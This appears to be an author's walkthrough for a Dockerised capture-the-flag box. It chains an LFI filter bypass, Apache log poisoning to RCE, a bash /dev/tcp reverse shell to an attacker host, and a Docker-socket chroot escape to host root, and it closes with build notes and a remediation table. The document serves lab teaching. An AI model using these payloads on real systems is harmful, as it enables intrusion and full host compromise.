# Walkthrough (author copy, Docker edition)

The site runs in a container. The shell you get is inside the container; the root flag is on the host.

Attacker box: `ATTACKER`, target: `TARGET`.

## 1. Enumeration
```bash
nmap -sC -sV -p- TARGET        # only 80/tcp (Apache)
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
curl http://TARGET/robots.txt  # Disallow: /backup/
```
- `/backup/old-notes.txt` has old portal credentials (`admin / Tidewater2019`). They do nothing: **rabbit hole**.
- The site uses `/index.php?page=<file>.php`, which suggests a file include.
- `/index.php?page=team.php` leaks the username **marcus**.

## 2. Finding the LFI
```bash
curl 'http://TARGET/index.php?page=../../../../etc/passwd'
```
Nothing leaks. `display_errors` is on, so the warning shows the path that was actually opened:
`.../pages/etc/passwd`. The `../` sequences were stripped, so the filter is a single `str_replace`.

Bypass: `....//` becomes `../` after one pass.
```bash
curl 'http://TARGET/index.php?page=....//....//....//....//etc/passwd'
```
`/etc/passwd` is returned. Note: wrappers like `php://filter` do not work, because the input is prefixed with the pages directory. Log poisoning is the intended route.

## 3. Log poisoning to RCE
Find a readable log (default path works): `/var/log/apache2/access.log`.
```bash
curl 'http://TARGET/index.php?page=....//....//....//....//var/log/apache2/access.log'
```
Apache logs the User-Agent, so put PHP in it:
```bash
curl -A "<?php system(\$_GET['c']); ?>" http://TARGET/
curl -G 'http://TARGET/index.php' \
  --data-urlencode 'page=....//....//....//....//var/log/apache2/access.log' \
  --data-urlencode 'c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data),NNN(docker)
```
Use single quotes inside the payload: Apache escapes double quotes in logs, which breaks the PHP.

## 4. Reverse shell and stabilising
```bash
nc -lvnp 4444     # on ATTACKER
curl -G 'http://TARGET/index.php' \
  --data-urlencode 'page=....//....//....//....//var/log/apache2/access.log' \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, stty raw -echo; fg, export TERM=xterm
```

## 5. User flag (optional lateral step)
```bash
cat /var/www/html/includes/config.php    # DB_USER marcus, DB_PASS ...
su marcus                                  # password reuse
cat ~/user.txt
```
`marcus` has no Docker access. Only `www-data` can reach the socket.

## 6. Privilege escalation: Docker socket
`id` shows an extra group, and `ls -l /var/run/docker.sock` shows the socket belongs to that group. `/opt/tidewater/deploy-notes.txt` explains why. Check access with `docker ps`: it lists containers on the **host**.
```bash
docker run --rm -it -v /:/mnt alpine chroot /mnt /bin/bash
cat /root/root.txt
```
In a non-interactive shell drop `-it` and run one command: `docker run --rm -v /:/mnt alpine chroot /mnt cat /root/root.txt`.
The command runs on the host's Docker daemon, so `chroot /mnt` enters the host filesystem and `/root/root.txt` is the host's flag. The alpine image is pre-pulled on the host by `up.sh`, so no internet is needed.

## Mistakes to avoid when building
- **Socket group mismatch**: the socket's group id differs per host. `entrypoint.sh` reads it at start-up and adds `www-data` before Apache starts, otherwise the privesc silently fails.
- **Secrets in the environment**: Apache workers inherit the container environment, so `entrypoint.sh` unsets `USER_FLAG` and `DEV_PASS` before starting Apache.
- **alpine not present on the host**: `up.sh` pulls it; without it the escalation needs internet access.
- **Logs not real files**: the official php:apache image symlinks logs to stdout, which cannot be included. The Dockerfile replaces them with real files readable by `www-data`.
- **A broken poison line**: a syntax error in the PHP payload makes every later include of the log fail. `reset.sh` truncates the log.
- **Huge logs**: include gets slow once the log is large; reset between attempts.
- **Unintended paths**: rebuild the image regularly (`docker compose build --pull`) so the base image is patched.

- **Reverse shell blocked**: the cloud NSG must allow outbound to your attacker port.

## Vulnerability list (for your own report)
| # | Issue | Severity | Fix |
|---|-------|----------|-----|
| 1 | Local file inclusion through `page` parameter with a bypassable blacklist filter | High | Allow-list of page names; never include user input |
| 2 | Web server logs readable by the web user, enabling log poisoning to RCE | High | Restrict log permissions; do not run PHP includes on untrusted paths |
| 3 | Verbose PHP errors reveal filesystem paths | Low | `display_errors Off` in production |
| 4 | Credentials in a web-readable config reused as an OS account password | Medium | Secrets store, unique passwords |
| 5 | Host Docker socket mounted into the web container and usable by `www-data` (equals host root) | Critical | Never mount the socket; use a restricted socket proxy or rootless build service |
| 6 | Sensitive notes and old credentials in `/backup/` listed in robots.txt | Low | Remove the folder; do not advertise paths |
| 7 | Username disclosure on the team page | Info | Avoid mapping staff names to system accounts |
